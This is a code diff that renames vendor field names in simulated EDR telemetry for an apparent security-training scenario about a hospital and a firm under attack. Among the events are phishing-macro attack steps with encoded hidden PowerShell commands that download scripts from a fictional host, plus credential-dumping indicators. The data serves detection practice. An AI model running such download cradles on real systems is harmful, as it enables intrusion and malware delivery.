@@ -862,7 +862,7 @@ const MEDCORE_EVENTS: TelemetryEvent[] = [
     src_ip: "192.168.10.45",
     description: "n.smits launched Epiq.EMR.exe on WS-MED-045",
     process: { name: "Epiq.EMR.exe", pid: 3320, parent_name: "explorer.exe", parent_pid: 2100, user: "n.smits", integrity: "medium" },
-    raw: { "s1.event_type": "PROCESS_CREATION", "s1.threat_level": "none", "file.signed": "true", "file.vendor": "Epiq Systems", "action_result": "allowed" }
+    raw: { "s1.eventType": "Process Creation", "file.signed": "true", "file.vendor": "Epiq Systems", "action_result": "allowed" }
   },
   {
     id: "mc_s1_002", ts: "2026-05-10T07:08:00.000Z",
@@ -871,7 +871,7 @@ const MEDCORE_EVENTS: TelemetryEvent[] = [
     src_ip: "192.168.10.67",
     description: "PACS imaging viewer launched on WS-MED-067",
     process: { name: "SecuraPACS.exe", pid: 1820, parent_name: "explorer.exe", parent_pid: 1600, user: "p.hoekstra", integrity: "medium" },
-    raw: { "s1.event_type": "PROCESS_CREATION", "s1.threat_level": "none", "file.signed": "true", "action_result": "allowed" }
+    raw: { "s1.eventType": "Process Creation", "file.signed": "true", "action_result": "allowed" }
   },
   {
     id: "mc_s1_003", ts: "2026-05-10T07:55:00.000Z",
@@ -879,7 +879,7 @@ const MEDCORE_EVENTS: TelemetryEvent[] = [
     vendor: "SentinelOne", hostname: "SRV-MEDCORE-FILE01", src_ip: "192.168.10.210",
     description: "Veeam backup job started on SRV-MEDCORE-FILE01",
     process: { name: "veeam.backup.service.exe", pid: 6700, parent_name: "services.exe", parent_pid: 668, user: "SYSTEM" },
-    raw: { "s1.event_type": "PROCESS_CREATION", "file.signed": "true", "action_result": "allowed" }
+    raw: { "s1.eventType": "Process Creation", "file.signed": "true", "action_result": "allowed" }
   },
   {
     // ⚠ ATTACK STEP 1 — Spear-phishing email opened, Word doc with macro
@@ -892,7 +892,7 @@ const MEDCORE_EVENTS: TelemetryEvent[] = [
     mitre_technique: "T1566.001",
     process: { name: "cmd.exe", pid: 7741, parent_name: "WINWORD.EXE", parent_pid: 6610, user: "dr.vandijk", cmdline: "cmd.exe /c whoami /all > C:\\Users\\DOCVDIJK\\AppData\\Local\\Temp\\~tmp88A.txt", integrity: "high" },
     file: { path: "C:\\Users\\dr.vandijk\\AppData\\Local\\Temp\\MedConf2026_Schedule.docm", sha256: "3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a" },
-    raw: { "s1.event_type": "INDICATOR", "s1.threat_level": "medium", "s1.indicator_name": "OFFICE_MACRO_CMD_SPAWN", "s1.action": "detect_only", "action_result": "allowed", "policy.name": "Clinical-Detect-Only", "file.signed": "false" }
+    raw: { "s1.eventType": "Indicators", "s1.indicator.name": "OFFICE_MACRO_CMD_SPAWN", "action_result": "allowed", "policy.name": "Clinical-Detect-Only", "file.signed": "false" }
   },
   {
     // ⚠ ATTACK STEP 2 — PowerShell with encoded command (not blocked)
@@ -903,7 +903,7 @@ const MEDCORE_EVENTS: TelemetryEvent[] = [
     description: "A hidden PowerShell command ran on WS-MED-022, launched from the earlier suspicious cmd.exe process",
     mitre_technique: "T1059.001",
     process: { name: "powershell.exe", pid: 7799, parent_name: "cmd.exe", parent_pid: 7741, user: "dr.vandijk", cmdline: "powershell.exe -WindowStyle Hidden -NonInteractive -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AYwBkAG4ALQBtAGUAZAB1AHAAZABhAHQAZQAuAG4AZQB0AC8AeAAuAHAAcwAxACcAKQA=", integrity: "high" },
-    raw: { "s1.event_type": "INDICATOR", "s1.threat_level": "high", "s1.indicator_name": "POWERSHELL_ENCODED_COMMAND", "s1.action": "detect_only", "action_result": "allowed", "policy.name": "Clinical-Detect-Only", "mitre.tactic": "Execution" }
+    raw: { "s1.eventType": "Indicators", "s1.indicator.name": "POWERSHELL_ENCODED_COMMAND", "action_result": "allowed", "policy.name": "Clinical-Detect-Only", "mitre.tactic": "Execution" }
   },
   {
     id: "mc_s1_006", ts: "2026-05-10T09:15:00.000Z",
@@ -914,7 +914,7 @@ const MEDCORE_EVENTS: TelemetryEvent[] = [
     expected_verdict: "tp", is_detection: true,
     description: "Trojan.GenericKD detected on WS-NURS-033",
     file: { path: "C:\\Users\\r.bakker\\AppData\\Temp\\update.exe", sha256: "6204651fac7f02eb1baba261cd2b4852d21eaf94f00bfcee0bd76c599e32c1e9" },
-    raw: { "s1.event_type": "THREAT", "threat.name": "Trojan.GenericKD", "action_result": "process_killed", "quarantine.status": "quarantined", "process.killed": "true", "s1.threat_level": "high" }
+    raw: { "s1.eventType": "Threats", "s1.threat.threatName": "Trojan.GenericKD", "s1.threat.confidenceLevel": "malicious", "s1.threat.classification": "Trojan", "s1.threat.mitigationStatus": "mitigated", "threat.name": "Trojan.GenericKD", "action_result": "process_killed", "quarantine.status": "quarantined", "process.killed": "true" }
   },
   {
     // ⚠ ATTACK STEP 3 — LSASS memory read (credential dumping — detected, not blocked)
@@ -926,7 +926,7 @@ const MEDCORE_EVENTS: TelemetryEvent[] = [
     description: "powershell.exe (PID 7799) on WS-MED-022 opened a handle to lsass.exe memory",
     mitre_technique: "T1003.001",
     process: { name: "powershell.exe", pid: 7799, parent_name: "cmd.exe", parent_pid: 7741, user: "dr.vandijk", cmdline: "powershell.exe -WindowStyle Hidden -NonInteractive -EncodedCommand ...", integrity: "high" },
-    raw: { "s1.event_type": "INDICATOR", "s1.threat_level": "critical", "s1.indicator_name": "LSASS_MEMORY_READ", "s1.target_process": "lsass.exe", "s1.granted_access": "0x1FFFFF", "s1.action": "detect_only", "s1.mitigation_status": "not_mitigated", "s1.detection.classification": "Suspicious Activity", "action_result": "allowed", "policy.name": "Clinical-Detect-Only" }
+    raw: { "s1.eventType": "Indicators", "s1.indicator.name": "LSASS_MEMORY_READ", "s1.tgtProcName": "lsass.exe", "s1.granted_access": "0x1FFFFF", "s1.mitigation_status": "not_mitigated", "s1.detection.classification": "Suspicious Activity", "action_result": "allowed", "policy.name": "Clinical-Detect-Only" }
   },
 
   // ── Post-compromise: lateral movement from WS-MED-022 toward EMR server ──────
@@ -1006,10 +1006,9 @@ const MEDCORE_EVENTS: TelemetryEvent[] = [
     mitre_technique: "T1550.002", mitre_tactic: "Lateral Movement",
     description: "SentinelOne raised an indicator on powershell.exe (PID 7799) on WS-MED-022 while it opened an SMB session to 192.168.10.200",
     raw: {
-      "s1.event_type":                     "INDICATOR",
-      "s1.threat_level":                   "critical",
-      "s1.indicator_name":                 "NEW_LOGON_SESSION_CREATED_IN_PROCESS",
-      "s1.indicator_description":          "A new NTLM logon session (LUID) was created inside powershell.exe without an interactive logon on this host.",
+      "s1.eventType": "Indicators",
+      "s1.indicator.name":                 "NEW_LOGON_SESSION_CREATED_IN_PROCESS",
+      "s1.indicator.description":          "A new NTLM logon session (LUID) was created inside powershell.exe without an interactive logon on this host.",
       "s1.detection.classification":       "Suspicious Activity",
       "s1.detection.classification_source": "Engine",
       "s1.mitigation_status":              "not_mitigated",
@@ -1033,7 +1032,7 @@ const MEDCORE_EVENTS: TelemetryEvent[] = [
     dst_ip: "52.96.12.14", dst_port: 443,
     description: "Outbound HTTPS connection from WS-MED-045 to emr-api.epiqsystems.com — allowed",
     network: { domain: "emr-api.epiqsystems.com", bytes_out: 8200, bytes_in: 1400 },
-    raw: { "s1.event_type": "IP_CONNECT", "action_result": "allowed" }
+    raw: { "s1.eventType": "IP Connect", "action_result": "allowed" }
   },
   {
     id: "mc_s1_009", ts: "2026-05-10T11:20:00.000Z",
@@ -1041,7 +1040,7 @@ const MEDCORE_EVENTS: TelemetryEvent[] = [
     vendor: "SentinelOne", hostname: "SRV-MEDCORE-DC01", src_ip: "192.168.10.1",
     description: "AD database integrity check (ntdsutil) on SRV-MEDCORE-DC01",
     process: { name: "ntdsutil.exe", pid: 5512, parent_name: "svchost.exe", parent_pid: 1024, user: "SYSTEM", cmdline: "ntdsutil.exe \"activate instance ntds\" \"files\" \"integrity\" quit quit" },
-    raw: { "s1.event_type": "PROCESS_CREATION", "s1.threat_level": "none", "file.signed": "true", "action_result": "allowed" }
+    raw: { "s1.eventType": "Process Creation", "file.signed": "true", "action_result": "allowed" }
   },
   {
     id: "mc_s1_010", ts: "2026-05-10T12:30:00.000Z",
@@ -1050,7 +1049,7 @@ const MEDCORE_EVENTS: TelemetryEvent[] = [
     description: "OUTLOOK.EXE dropped MedConf_Invoice.zip on WS-NURS-044 Desktop",
     file: { path: "C:\\Users\\m.verhoeven\\Desktop\\MedConf_Invoice.zip", sha256: "ae5949f8d2f7e02942e7e7a528edea083f876cffa946879983a6f67331f69443" },
     mitre_technique: "T1566.001",
-    raw: { "s1.event_type": "FILE_CREATION", "s1.threat_level": "low", "s1.indicator_name": "SUSPICIOUS_EMAIL_ATTACHMENT", "s1.action": "detect_only", "action_result": "allowed", "file.extension": ".zip", "parent.process": "OUTLOOK.EXE" }
+    raw: { "s1.eventType": "File Creation", "s1.indicator.name": "SUSPICIOUS_EMAIL_ATTACHMENT", "action_result": "allowed", "file.extension": ".zip", "parent.process": "OUTLOOK.EXE" }
   },
 
   // ════════════════════════════════════════════════════════════════
@@ -1335,7 +1334,7 @@ const MEDCORE_EVENTS: TelemetryEvent[] = [
     fp_explanation: "IT admin ran a PowerShell script to bulk-reset passwords for 30 nurse accounts ahead of a compliance audit. The script uses Set-ADAccountPassword in a loop — this matches 'password brute-force preparation' heuristics but is fully authorised (change CHG-MC-441). The admin account is a Tier-1 admin with MFA, running from the IT jump server.",
     description: "admin.vandenberg bulk AD password reset (compliance audit prep)",
     process: { name: "powershell.exe", pid: 6700, parent_name: "explorer.exe", parent_pid: 5900, user: "admin.vandenberg", cmdline: "powershell.exe -File C:\\IT\\scripts\\Reset-NursePasswords.ps1 -OU 'OU=Nurses,DC=medcore,DC=nl'" },
-    raw: { "s1.event_type": "PROCESS_CREATION", "s1.threat_level": "none", "s1.detection.classification_source": "Engine", "file.signed": "true", "action_result": "allowed" }
+    raw: { "s1.eventType": "Process Creation", "s1.detection.classification_source": "Engine", "file.signed": "true", "action_result": "allowed" }
   },
 
   // ── IT Verify events — MedCore ───────────────────────────────────────────────
@@ -1492,7 +1491,7 @@ const MEDCORE_EVENTS: TelemetryEvent[] = [
     process: { name: "robocopy.exe", pid: 2200, parent_name: "svchost.exe", parent_pid: 2100,
                user: "svc-backup", cmdline: "robocopy \\\\SRV-MED-EHR01\\records \\\\NAS-BACKUP-01\\ehr-archive /MIR /LOG:backup.log" },
     raw: {
-      "s1.event_type": "PROCESS_CREATION", "s1.confidenceLevel": "trusted",
+      "s1.eventType": "Process Creation", "s1.threat.confidenceLevel": "trusted",
       "s1.file_bytes_copied": "50465865728", "s1.destination": "\\\\NAS-BACKUP-01\\ehr-archive",
       "schedule.cron": "0 1 * * *", "action_result": "allowed" }
   },
@@ -1508,7 +1507,7 @@ const MEDCORE_EVENTS: TelemetryEvent[] = [
     process: { name: "ExportTool.exe", pid: 4410, parent_name: "explorer.exe", parent_pid: 3900,
                user: "dr.smit", cmdline: "ExportTool.exe --query oncology_2020_2025 --anonymise --out C:\\Research\\export.csv" },
     raw: {
-      "s1.event_type": "PROCESS_CREATION", "s1.confidenceLevel": "trusted",
+      "s1.eventType": "Process Creation", "s1.threat.confidenceLevel": "trusted",
       "ehr.records_exported": "3120", "ehr.anonymised": "true",
       "dpo.approval_ref": "MED-DPO-2026-08", "action_result": "allowed" }
   },
@@ -1521,7 +1520,7 @@ const MEDCORE_EVENTS: TelemetryEvent[] = [
     mitre_technique: "T1052.001", mitre_tactic: "Exfiltration",
     description: "SentinelOne blocked n.bakker from copying 8,400 patient records to a USB drive at 19:14",
     raw: {
-      "s1.event_type": "USB_DEVICE_CONTROL", "s1.action": "blocked",
+      "s1.eventType": "Device Control",
       "s1.dlp_policy": "GDPR-Patient-PII", "s1.dlp_violation": "true",
       "usb.serial": "4A9C-0012", "usb.vendor": "SanDisk",
       "file.name": "patient_records_export.csv", "file.size_bytes": "62914560",
@@ -1648,7 +1647,7 @@ const MEDCORE_EVENTS: TelemetryEvent[] = [
     user_email: "p.hoekstra@medcorehealth.org",
     description: "p.hoekstra retrieved CT chest scan for patient P-18847 from PACS (SecuraPACS)",
     raw: {
-      "s1.event_type": "IP_CONNECT", "action_result": "allowed",
+      "s1.eventType": "IP Connect", "action_result": "allowed",
       "pacs.action": "image.retrieve", "pacs.modality": "CT",
       "pacs.study_uid": "1.2.840.10008.5.1.4.1.1.2.47821",
       "pacs.patient_id": "P-18847", "pacs.images_fetched": "84",
@@ -1662,7 +1661,7 @@ const MEDCORE_EVENTS: TelemetryEvent[] = [
     user_email: "dr.vandijk@medcorehealth.org",
     description: "dr.vandijk queried PACS for echocardiogram images (P-19203) on WS-MED-022",
     raw: {
-      "s1.event_type": "IP_CONNECT", "action_result": "allowed",
+      "s1.eventType": "IP Connect", "action_result": "allowed",
       "pacs.action": "image.query", "pacs.modality": "US",
       "pacs.study_uid": "1.2.840.10008.5.1.4.1.1.6.1.19203",
       "pacs.patient_id": "P-19203", "network.destination": "SRV-MEDCORE-PACS01" }
@@ -1717,7 +1716,7 @@ const MEDCORE_EVENTS: TelemetryEvent[] = [
     process: { name: "wuauclt.exe", pid: 1120, parent_name: "svchost.exe", parent_pid: 668,
                user: "SYSTEM", cmdline: "wuauclt.exe /updatenow" },
     raw: {
-      "s1.event_type": "PROCESS_CREATION", "s1.threat_level": "none",
+      "s1.eventType": "Process Creation",
       "file.signed": "true", "windows.update.kb_ids": "KB5034441,KB5034122,KB5035942",
       "windows.update.reboot_required": "false", "action_result": "allowed" }
   },
@@ -1729,7 +1728,7 @@ const MEDCORE_EVENTS: TelemetryEvent[] = [
     process: { name: "MsMpEng.exe", pid: 2244, parent_name: "services.exe", parent_pid: 668,
                user: "SYSTEM", cmdline: "MsMpEng.exe" },
     raw: {
-      "s1.event_type": "PROCESS_CREATION", "s1.threat_level": "none",
+      "s1.eventType": "Process Creation",
       "file.signed": "true", "defender.definition_version": "1.409.12.0",
       "defender.update_type": "signature", "action_result": "allowed" }
   },
@@ -2844,14 +2843,15 @@ const NEXACORP_ATTACKS: TelemetryEvent[] = [
     description: "m.edwards copied 18 deal model files to USB E:\\ on LAPTOP-NX-M.EDWARDS",
     mitre_technique: "T1052.001",
     file: { path: "E:\\DealModels\\DealModel_ProjectAlpha.xlsx", sha256: "fc5fe4cd910395903aa0fdc4cec74ee48c5e81c57f50182f76d778f3418e2c24" },
-    raw: { "mde.device_id": "LAPTOP-NX-M.EDWARDS", "file.destination": "E:\\", "usb.serial": "4F3A-11B2", "action_result": "allowed", "policy.name": "DLP-Audit" }
+    raw: { "DeviceName": "laptop-nx-m.edwards", "DeviceId": "b91c4de2a7f0451c9d3e6f2a1b8c0d4e5f6a7b8c", "ActionType": "FileCreated", "FileName": "DealModel_ProjectAlpha.xlsx", "FolderPath": "E:\\DealModels\\DealModel_ProjectAlpha.xlsx", "SHA256": "fc5fe4cd910395903aa0fdc4cec74ee48c5e81c57f50182f76d778f3418e2c24", "InitiatingProcessFileName": "explorer.exe", "mde.AdditionalFields": "{\"DriveLetter\":\"E:\",\"SerialNumber\":\"4F3A-11B2\"}", "action_result": "allowed" }
   },
   {
     id: "nx_c3", ts: "2026-05-10T14:25:00.000Z", source: "edr", event_type: "net_connection",
     severity: "high", vendor: "Microsoft Defender for Endpoint", hostname: "LAPTOP-NX-M.EDWARDS", src_ip: "10.20.1.55", dst_ip: "104.18.32.7", dst_port: 443,
     description: "34 MB outbound transfer from LAPTOP-NX-M.EDWARDS to transfernow.net (104.18.32.7:443) by OUTLOOK.EXE",
     mitre_technique: "T1048",
-    raw: { "mde.alert_id": "da637000001111222", "process.name": "OUTLOOK.EXE", "destination.ip": "104.18.32.7", "destination.port": "443", "destination.domain": "transfernow.net", "network.bytes_out": "35651584", "action_result": "allowed" }
+    network: { domain: "transfernow.net", bytes_out: 35_651_584 },
+    raw: { "DeviceName": "laptop-nx-m.edwards", "DeviceId": "b91c4de2a7f0451c9d3e6f2a1b8c0d4e5f6a7b8c", "ActionType": "ConnectionSuccess", "InitiatingProcessFileName": "OUTLOOK.EXE", "RemoteIP": "104.18.32.7", "RemotePort": "443", "RemoteUrl": "transfernow.net", "mde.AlertTitle": "Outbound data transfer to a file-sharing service", "mde.IncidentId": "637000001111", "action_result": "allowed" }
   },
   {
     id: "nx_c4", ts: "2026-05-10T14:32:00.000Z", source: "o365", event_type: "email_sent",
@@ -2955,7 +2955,7 @@ const MEDCORE_ATTACKS: TelemetryEvent[] = [
     description: "Opening a Word document on WS-MED-PETERS triggered a hidden command line and then a hidden PowerShell command",
     mitre_technique: "T1059.001",
     process: { name: "powershell.exe", pid: 4422, parent_name: "cmd.exe", parent_pid: 4421, user: "dr.peters", cmdline: "powershell.exe -WindowStyle Hidden -EncodedCommand JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAOwAkAGMALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AYwBkAG4ALQBtAGUAZAB1AHAAZABhAHQAZQAuAG4AZQB0AC8AbQAuAHAAcwAxACcAKQA=" },
-    raw: { "s1.indicator_name": "OFFICE_MACRO_CMD_SPAWN", "s1.threat_level": "medium", "s1.action": "detect_only", "policy.name": "Clinical-Detect-Only", "action_result": "allowed" }
+    raw: { "s1.indicator.name": "OFFICE_MACRO_CMD_SPAWN", "policy.name": "Clinical-Detect-Only", "action_result": "allowed" }
   },
   {
     id: "mc_a3", ts: "2026-05-10T08:16:00.000Z", source: "dns", event_type: "dns_query",
@@ -2971,7 +2971,7 @@ const MEDCORE_ATTACKS: TelemetryEvent[] = [
     description: "Ransomware.MedLock detected on SRV-MEDCORE-EMR01 (847 files encrypted)",
     mitre_technique: "T1486",
     file: { path: "C:\\Windows\\Temp\\taskhost.exe", sha256: "f2da3d1410c5058720a4307acf5fec7fc2b54285be9dd89eae108cce368dcde7" },
-    raw: { "s1.event_type": "THREAT", "threat.name": "Ransomware.MedLock", "s1.threat_level": "critical", "action_result": "process_killed", "s1.files_encrypted": "847", "s1.network_isolated": "true", "s1.rollback_available": "true", "file.hash.sha256": "f2da3d1410c5058720a4307acf5fec7fc2b54285be9dd89eae108cce368dcde7" }
+    raw: { "s1.eventType": "Threats", "s1.threat.threatName": "Ransomware.MedLock", "s1.threat.confidenceLevel": "malicious", "s1.threat.classification": "Ransomware", "s1.threat.mitigationStatus": "mitigated", "threat.name": "Ransomware.MedLock", "action_result": "process_killed", "s1.files_encrypted": "847", "s1.network_isolated": "true", "s1.rollback_available": "true", "file.hash.sha256": "f2da3d1410c5058720a4307acf5fec7fc2b54285be9dd89eae108cce368dcde7" }
   },
   // ── Chain B ──────────────────────────────────────────────────────────────
   {
@@ -2986,7 +2986,7 @@ const MEDCORE_ATTACKS: TelemetryEvent[] = [
     severity: "medium", vendor: "SentinelOne", hostname: "WS-MED-045", user_email: "n.smits@medcorehealth.org", src_ip: "192.168.10.45",
     description: "n.smits copied 94 patient PDF files to USB F:\\ on WS-MED-045",
     mitre_technique: "T1052.001",
-    raw: { "s1.event_type": "FILE_CREATION", "file.destination": "F:\\", "usb.vendor": "SanDisk", "usb.serial": "7A2F-CC01", "s1.action": "detect_only", "action_result": "allowed" }
+    raw: { "s1.eventType": "File Creation", "file.destination": "F:\\", "usb.vendor": "SanDisk", "usb.serial": "7A2F-CC01", "action_result": "allowed" }
   },
   {
     id: "mc_b3", ts: "2026-05-10T11:30:00.000Z", source: "cloud_azure", event_type: "cloud_api_call",
@@ -3031,7 +3031,7 @@ const MEDCORE_ATTACKS: TelemetryEvent[] = [
     description: "robocopy ran as p.hoekstra on SRV-MEDCORE-PACS01, copying the 2026 DICOM share (22 GB) to C:\\Temp\\backup",
     mitre_technique: "T1039",
     process: { name: "robocopy.exe", pid: 5512, parent_name: "cmd.exe", parent_pid: 5511, user: "p.hoekstra", cmdline: "robocopy \\\\SRV-MEDCORE-PACS01\\DICOM\\2026 C:\\Temp\\backup /E /Z" },
-    raw: { "s1.indicator_name": "SUSPICIOUS_BULK_COPY", "s1.threat_level": "critical", "s1.action": "detect_only", "action_result": "allowed", "robocopy.files_copied": "8841" }
+    raw: { "s1.indicator.name": "SUSPICIOUS_BULK_COPY", "action_result": "allowed", "robocopy.files_copied": "8841" }
   },
   // ── Chain D — Cisco VPN brute force → clinical account compromise ──────────
   {
@@ -3072,9 +3072,8 @@ const MEDCORE_ATTACKS: TelemetryEvent[] = [
     user_email: "n.smit@medcorehealth.org",
     description: "An RDP connection to WS-NURS-022 originated from the VPN address assigned to n.smit's session",
     mitre_technique: "T1021.001", mitre_tactic: "Lateral Movement",
-    raw: { "s1.event_type": "IP_CONNECT",
-           "s1.indicator_name": "REMOTE_DESKTOP_SESSION_FROM_VPN_RANGE",
-           "s1.threat_level": "critical", "s1.action": "alert",
+    raw: { "s1.eventType": "IP Connect",
+           "s1.indicator.name": "REMOTE_DESKTOP_SESSION_FROM_VPN_RANGE",
            "source.ip": "91.108.4.222", "destination.port": "3389",
            "network.destination": "WS-NURS-022", "network.protocol": "tcp",
            "action_result": "allowed" }
